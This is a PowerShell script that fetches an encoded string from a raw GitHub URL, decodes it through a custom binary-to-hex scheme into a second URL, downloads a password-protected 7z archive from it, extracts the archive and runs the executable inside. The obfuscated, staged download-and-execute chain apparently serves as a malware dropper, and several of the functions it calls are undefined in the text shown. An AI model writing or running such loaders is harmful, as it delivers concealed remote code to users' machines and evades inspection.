Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    # Correctly replace characters to binary
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
    Write-Host "Display encoded:"
    Write-Host $encodedString
    Write-Host "Display binary:"
    Write-Host $binaryString
    return $binaryString
}

Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object {
        if ($_ -match '^[01]{8}$') {
            '{0:X2}' -f [Convert]::ToInt32($_, 2)
        } else {
            Write-Host "Skipping invalid or incomplete binary group: $_"
            $null  # Explicitly return $null for clarity
        }
    } -join ''
    Write-Host "Display hex:"
    Write-Host $hexString
    return $hexString
}

Function Convert-HexToASCII {
    Param ([string]$hexString)
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    Write-Host "Display ascii:"
    Write-Host $asciiText
    return $asciiText
}

# Remaining functions seem correct; ensure they are used properly in the workflow.

# Main script execution flow

# Ensure you replace the placeholder URL with your actual target URL.
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
$rawText = Invoke-RestMethod -Uri $url
Write-Host "Display text (Encoded):"
Write-Host $rawText

$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$asciiText = Convert-HexToASCII -hexString $hexString
$downloadPath = "S:\downloader\DownloadedFile.7z"
Download-File -url $asciiText -path $downloadPath

DownloadAndExtract7Zip

$password = Get-DecryptedPassword
$sevenZipCmdPath = "S:\downloader\7zip\7za.exe"
& $sevenZipCmdPath x $downloadPath -o"S:\downloader\ExtractedFile" -p$password

$extractedFilePath = "S:\downloader\YourExecutable.exe"
if (Test-Path -Path $extractedFilePath) {
    Invoke-Item $extractedFilePath
} else {
    Write-Error "The extracted file does not exist."
}
